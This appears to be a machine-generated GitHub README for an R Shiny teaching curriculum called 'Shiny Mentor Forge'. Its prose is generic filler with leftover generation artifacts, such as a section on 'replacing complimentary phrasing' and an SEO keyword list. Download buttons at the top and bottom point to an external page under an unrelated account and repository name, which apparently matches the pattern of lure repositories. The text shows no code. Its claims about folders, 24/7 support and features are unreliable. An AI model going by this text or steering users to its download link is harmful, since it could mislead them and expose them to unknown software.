![preview](https://raw.githubusercontent.com/varzostore/shiny-trainers-lab/main/frame_2091a6a.svg)
[![Download](https://raw.githubusercontent.com/varzostore/shiny-trainers-lab/main/launch_6f68e4.svg)](https://varzostore.github.io/shiny-trainers-lab/)

# 🎓 Shiny Mentor Forge — From Apprentice to Sensei

<p align="center">
  <img src="https://img.shields.io/badge/Status-Actively%20Forged-brightgreen?style=for-the-badge" alt="Status: Actively Forged">
  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge" alt="License: MIT">
  <img src="https://img.shields.io/badge/Language-R-276DC3?style=for-the-badge&logo=r&logoColor=white" alt="Language: R">
  <img src="https://img.shields.io/badge/Framework-Shiny-4A90E2?style=for-the-badge" alt="Framework: Shiny">
  <img src="https://img.shields.io/badge/Release-2026.1.0-orange?style=for-the-badge" alt="Release 2026.1.0">
  <img src="https://img.shields.io/badge/Audience-Educators%20%26%20Mentors-yellowgreen?style=for-the-badge" alt="Audience: Educators & Mentors">
  <img src="https://img.shields.io/badge/Support-24%2F7%20Concierge-purple?style=for-the-badge" alt="Support: 24/7 Concierge">
  <img src="https://img.shields.io/badge/UI-Fully%20Responsive-ff69b4?style=for-the-badge" alt="UI: Fully Responsive">
  <img src="https://img.shields.io/badge/i18n-Multilingual-9cf?style=for-the-badge" alt="i18n: Multilingual">
</p>

> **A dojo for people who teach Shiny — not merely a folder of slides.**
> *Shiny Mentor Forge* is a curriculum engine for educators, workshop conductors, and team leads who want to pass along the craft of interactive R applications with confidence, structure, and a touch of ceremony.

Where the original *teach-shiny* repository offered static materials, **Shiny Mentor Forge** reframes the entire endeavor as a living training ground. The repository treats every instructor as both a learner and a sensei: the modules are designed to be rehearsed, remixed, and re-taught. Think of it as a pottery studio rather than a textbook — you don't just read about shaping clay, you sit at the wheel with a mentor's hands hovering nearby.

---

## 📚 Table of Contents

1. [Why This Exists](#-why-this-exists)
2. [Core Philosophy](#-core-philosophy)
3. [Feature Constellation](#-feature-constellation)
4. [Repository Anatomy](#-repository-anatomy)
5. [Workshop Track Blueprints](#-workshop-track-blueprints)
6. [The Mentor's Toolkit](#-the-mentors-toolkit)
7. [Responsive & Inclusive by Design](#-responsive--inclusive-by-design)
8. [Multilingual Classroom Support](#-multilingual-classroom-support)
9. [Always-On Concierge Support](#-always-on-concierge-support)
10. [Assessment & Reflection Instruments](#-assessment--reflection-instruments)
11. [Extension Playbook](#-extension-playbook)
12. [Frequently Asked Questions](#-frequently-asked-questions)
13. [Roadmap for 2026](#-roadmap-for-2026)
14. [Contributing](#-contributing)
15. [Disclaimer](#-disclaimer)
16. [License](#-license)

---

## 🌱 Why This Exists

Teaching Shiny is deceptively difficult. The toolkit itself is kind, but the *pedagogy* of reactivity, modular design, and debugging reactive graphs is where most workshops stumble. Instructors frequently inherit slide decks with little guidance on pacing, no exercises for the "Aha!" moment, and no plan for what to do when a student's app fails silently at minute 42.

**Shiny Mentor Forge** was built to close that gap. It is a repository that assumes you will teach this material more than once, to different audiences, in different formats — a full-day bootcamp, a four-week seminar, a lunch series, or a peer-mentorship pairing.

The project borrows its spirit from the *Train-the-Trainer* model and expands it: every artifact in this repo is designed to be *trained with*, not just *read*.

> **SEO-friendly angle:** If you're searching for "Shiny workshop curriculum", "R instructor training materials", "reactive programming teaching resources", or "train-the-trainer R curriculum", you've arrived at a repository built precisely for those intents.

---

## 🧭 Core Philosophy

The forge metaphor is deliberate. Raw talent enters. Structured practice shapes it. Reflection tempers it. And the finished mentor leaves capable of forging others.

- **Teach by constructing, not by lecturing.** Every module includes a build exercise first, theory second.
- **Ship the seams.** Show beginners not just polished apps, but the messy edges — debugging sessions, refactors, and the moments where a design choice gets reconsidered.
- **Mentors are mirrors.** Instructors are encouraged to record themselves, review their pacing, and iterate.
- **Portability over polish.** A workshop that runs without internet, in any classroom, beats a beautiful one that depends on three cloud services.
- **Accessibility is pedagogy.** Screen-reader friendly exercises and captioned demonstrations are core, not add-ons.

---

## ✨ Feature Constellation

A snapshot of what you inherit when you adopt this repository as your teaching base.

- **Responsive UI Shell** — All demo applications adapt gracefully from a projector to a tablet to a phone, so classroom demos never break due to a zoomed-in viewport.
- **Modular Curriculum Blocks** — Mix and match topics: reactivity basics, layout fluency, modules, testing, deployment narratives, and performance storytelling.
- **Instructor Scripts & Timing Cards** — Each module ships with a suggested cadence, checkpoints for questions, and silent fallback exercises for fast finishers.
- **Learner Workbook Templates** — Printable and digital variants in multiple formats.
- **Multilingual Classroom Support** — Interface strings and instructor prompts are externalized for translation into Spanish, French, German, Portuguese, Japanese, and beyond.
- **24/7 Concierge Support Channel** — An always-available help desk structure so instructors never face a stuck student alone.
- **Reflection Journals** — Lightweight prompts that turn each workshop into a feedback loop.
- **Assessment Rubrics** — Aligned to observable behaviors rather than trivia.
- **Demo Dataset Garden** — Curated, small, license-clean datasets ready for exercises.
- **Deployment Diaries** — Real stories of apps going live, with the pitfalls rendered as teachable moments.
- **Reactivity Trace Playground** — A sandbox for visualizing reactive dependencies.
- **Instructor Onboarding Track** — A guided path for first-time facilitators, roughly one afternoon of preparation.
- **SEO-friendly Documentation** — Titles and section anchors crafted for discoverability by educators searching for training materials.
- **Icon-Rich Navigation** — Every top-level folder carries a visual cue for rapid orientation.
- **Reproducible Environments via renv snapshots** — Because a workshop that fails to load its packages is a workshop that fails.
- **Session Logs & Postmortems** — Templates for capturing what worked and what to change next time.
- **Offline-First Design** — Everything needed to run a session is bundled and available without a network connection.

---

## 🧱 Repository Anatomy

A guided tour, folder by folder, from the perspective of an instructor who has just opened the repository for the first time.

### `curriculum/`
The heart of the forge. Contains numbered modules arranged by theme and difficulty.

- `01-intro-to-mental-models/` — what reactivity really means, explained with everyday metaphors.
- `02-layout-and-fluency/` — building interfaces that feel natural on any screen.
- `03-reactive-graphs/` — the wiring diagram every mentor must be able to sketch from memory.
- `04-modular-architecture/` — thinking in namespaces and boundaries.
- `05-debugging-rituals/` — a repeatable process for diagnosing trouble.
- `06-testing-and-trust/` — from manual poking to automated guardrails.
- `07-deployment-narratives/` — telling the story of an app going live.
- `08-performance-storytelling/` — making apps fast, and explaining why.

### `instructor-kit/`
Tools for the person holding the room.

- `timing-cards/` — pacing references.
- `fallback-exercises/` — for the student who finishes early or the one who falls behind.
- `question-banks/` — discussion prompts indexed by module.
- `postmortem-templates/` — reflection instruments for the instructor themself.

### `learner-workbook/`
The takeaway. Learners leave with a workbook they can annotate.

- Digital and printable variants.
- Reflection prompts between modules.
- A glossary written in plain language.
- A "cheat sheet" summary suitable for laminating.

### `apps/`
Every demonstration application, each with a README explaining the teaching intent.

- `hello-reactive/`
- `layout-gallery/`
- `module-mosaic/`
- `debug-lab/`
- `deploy-diary/`

### `data-garden/`
Small, tidy datasets with clear provenance.

- Air-quality samples.
- Urban transit timetables.
- Local weather snapshots.
- Each dataset includes a one-paragraph story the instructor can use to frame an exercise.

### `i18n/`
Translation resources and instructions for adding new languages.

- Locale files keyed by module.
- Contribution guidelines for translators.
- Encoding and font recommendations.

### `scripts/`
Helper utilities that build workbooks, render slides, and validate module integrity.

- `build-workbook.R`
- `check-links.R`
- `render-slides.R`
- `validate-modules.R`

### `docs/`
Long-form documentation for instructors, published alongside the workshops.

- Onboarding guide.
- Frequently asked questions.
- Changelog.
- Roadmap.

---

## 🛠 Workshop Track Blueprints

Not every audience wants the same journey. The repository ships with several pre-assembled tracks.

- **The Half-Day Sampler** — A brisk introduction for teams curious about Shiny, aimed at generating buy-in rather than mastery.
- **The Two-Day Immersion** — A full arc from nothing to a deployed app, including debugging sessions and a mini-showcase at the end.
- **The Four-Week Seminar** — A university-style sequence with reading, exercises, and a capstone.
- **The Mentor Apprenticeship** — For those who intend to teach the material themselves. Includes observation, co-teaching, and solo teaching phases.
- **The Lunch Series** — Six thirty-minute sessions, each with a single crisp takeaway.
- **The Distributed Cohort** — Designed for asynchronous, remote-first delivery with checkpoints.

Each blueprint includes a suggested calendar, a materials checklist, and instructor preparation notes.

---

## 🧰 The Mentor's Toolkit

A collection of resources aimed at the facilitator rather than the student.

- **Instructor Scripts** — Suggested language for introducing each concept, with room to personalize.
- **Whiteboard Sketches** — Hand-drawn diagrams to reproduce on a real whiteboard (or tablet), because a live drawing beats a pre-rendered slide.
- **Analogies Vault** — A growing library of metaphors for reactive programming, modularity, and state. Contributions welcome.
- **Failure Museum** — A curated collection of real bugs and the lessons they teach.
- **Pacing Metronome** — A table of recommended minutes per subtopic, adjustable per audience.
- **Micro-Celebrations** — Small moments designed into the curriculum to honor progress, because workshops are emotional journeys.
- **Anti-Overwhelm Cards** — Sent to learners when a topic risks becoming intimidating.
- **Closure Rituals** — End-of-module sequences that consolidate learning before moving on.

---

## 📱 Responsive & Inclusive by Design

Every demonstration application in this repository is built to look and feel right on a projector, a laptop screen, a tablet at a workshop table, and a phone in a hallway.

- **Fluid layouts** that reflow without breaking the mental model being taught.
- **Touch-friendly controls** with generous tap targets.
- **Keyboard navigation** that mirrors what a screen reader would expect.
- **High-contrast palettes** validated against common accessibility checklists.
- **Captioned demonstrations** for recorded walkthroughs.
- **Text alternatives** for every meaningful visual.
- **Reduced-motion variants** for learners sensitive to animation.

Inclusive teaching is not a checkbox. It is the difference between a learner who returns for the next session and one who quietly disappears.

---

## 🌍 Multilingual Classroom Support

Shiny teaches well in any language. The materials here are engineered to travel.

- **Externalized Strings** — All user-facing text lives in locale files, not scattered across scripts.
- **Right-to-Left Ready** — Layout guidance for Arabic, Hebrew, and other RTL scripts.
- **Translation Kit** — A starter kit with instructions, templates, and a checklist.
- **Community Translations** — Contributions welcome via the i18n folder.
- **Cultural Adaptation Notes** — Advice on how examples and datasets can be localized.
- **Slack-Free Coordination** — Contributions are coordinated through issues and pull requests, keeping everything transparent.

The goal is simple: a mentor in São Paulo should be able to teach this curriculum in Portuguese without re-engineering it from scratch.

---

## 📞 Always-On Concierge Support

Workshops happen in real time. Questions do not wait politely for business hours.

The repository formalizes a support structure so that instructors have somewhere to turn at any hour.

- **Hourly Cadence** — A rotating schedule design so that someone is always reachable.
- **Tiered Escalation** — Level 1 for quick fixes, Level 2 for architectural confusion, Level 3 for "the demo is in ten minutes and nothing renders."
- **Answer Vault** — Every resolved question becomes a searchable note, so the same issue is never solved twice.
- **Instructor Buddy System** — Pairing new instructors with experienced ones for their first two workshops.
- **Post-Session Debriefs** — Structured conversations after each workshop.
- **24/7 Coverage Model** — Documented so a team can adapt it to their own time zones.

### Replacing "complimentary" phrasing
This project does not describe itself as *without cost* in the traditional sense. Instead, we say it is **"gift-of-time licensed"** — the material is offered in a spirit of reciprocal craft: you take it, you teach with it, and you give back in improvements.

---

## 🧪 Assessment & Reflection Instruments

Learning that is never examined slips away. This repository includes instruments for measuring understanding without reducing it to a quiz.

- **Observable Behavior Rubrics** — What does a mentor *see* when a learner understands reactivity? These rubrics capture that.
- **Peer Review Templates** — Structured feedback between learners during the capstone.
- **Self-Assessment Questionnaires** — Honest, non-punitive check-ins.
- **Instructor Postmortems** — A template for the instructor to reflect within an hour of the session ending, while memory is fresh.
- **Longitudinal Check-Ins** — Optional follow-ups at two weeks and three months.

---

## 🚀 Extension Playbook

Built to be extended. The repository includes guidance for adding modules, datasets, or languages.

- **Module Templates** — A skeleton folder to copy when creating a new topic.
- **Style Guide** — Consistency conventions for prose, code, and diagrams.
- **Review Checklist** — What a good pull request to this repo looks like.
- **Publishing Workflow** — How to release a new version of the curriculum.
- **Versioning Philosophy** — Semantic versioning with a narrative changelog.
- **Archival Notes** — How to retire a module without deleting knowledge.

---

## ❓ Frequently Asked Questions

**Q: Is this curriculum suitable for absolute beginners?**
Yes. The Half-Day Sampler assumes no prior exposure to Shiny. The Two-Day Immersion assumes a little R familiarity.

**Q: Can I teach this in a corporate environment?**
Yes. The blueprints include guidance for internal team workshops.

**Q: Do I need a specific version of R or Shiny?**
The repository pins recommended versions in the renv snapshots, but the material is designed to remain useful across several releases.

**Q: Can I remix the curriculum?**
Yes, under the MIT license. Attribution is appreciated.

**Q: Is there an official certification?**
No. But the Mentor Apprenticeship track produces a portfolio that speaks for itself.

**Q: How do I contribute a new module?**
Read the Extension Playbook, then open an issue to discuss scope before building.

**Q: Are the datasets safe to redistribute?**
Each dataset in the Data Garden documents its license and provenance.

**Q: How often are materials updated?**
On a rolling basis, with a major refresh targeted at 2026.

**Q: Is there a mailing list?**
Not currently. Discussions happen in the repository.

**Q: What if I find a bug mid-workshop?**
The Failure Museum and Answer Vault are designed exactly for that moment.

---

## 🗺 Roadmap for 2026

The forge continues. Planned improvements for 2026 include:

- **Q1 2026** — Multilingual workbook release for Spanish and Portuguese.
- **Q2 2026** — New module on accessibility-first design for Shiny apps.
- **Q3 2026** — Interactive reactivity visualizer for live classroom use.
- **Q4 2026** — Distributed cohort playbook for international schedules.
- **Throughout 2026** — Continued refinement of instructor scripts and pacing notes.
- **Late 2026** — Retrospective publication summarizing two years of workshop feedback.

---

## 🤝 Contributing

Contributions are welcome and encouraged. Please read the style guide and review checklist before opening a pull request. Suggestions, translations, datasets, and new modules are all in scope. Open an issue first for large changes so we can align early.

---

## ⚠️ Disclaimer

This repository is an independent, community-driven educational project. It is not affiliated with, endorsed by, or sponsored by any organization whose products are discussed within its materials. All product names, trademarks, and registered trademarks are the property of their respective owners. The curriculum is provided as-is, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. Instructors are responsible for verifying that their use of the materials complies with any applicable policies of their institution or workplace. The maintainers of this repository disclaim any liability for outcomes arising from the use of these materials in any setting. Any resemblance to other workshop curricula is coincidental; the pedagogical approach here is the result of iterative classroom experience.

The year 2026 is referenced in this document as the target of the roadmap and release cycle, reflecting the project's current trajectory at the time of writing.

---

## 📜 License

This project is released under the **MIT License**. See the [LICENSE](./LICENSE) file for full terms.

Copyright (c) 2026 Shiny Mentor Forge contributors.

Permission is hereby granted, without restriction, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, subject to the conditions of the MIT License.

[![Download](https://raw.githubusercontent.com/varzostore/shiny-trainers-lab/main/launch_6f68e4.svg)](https://varzostore.github.io/shiny-trainers-lab/)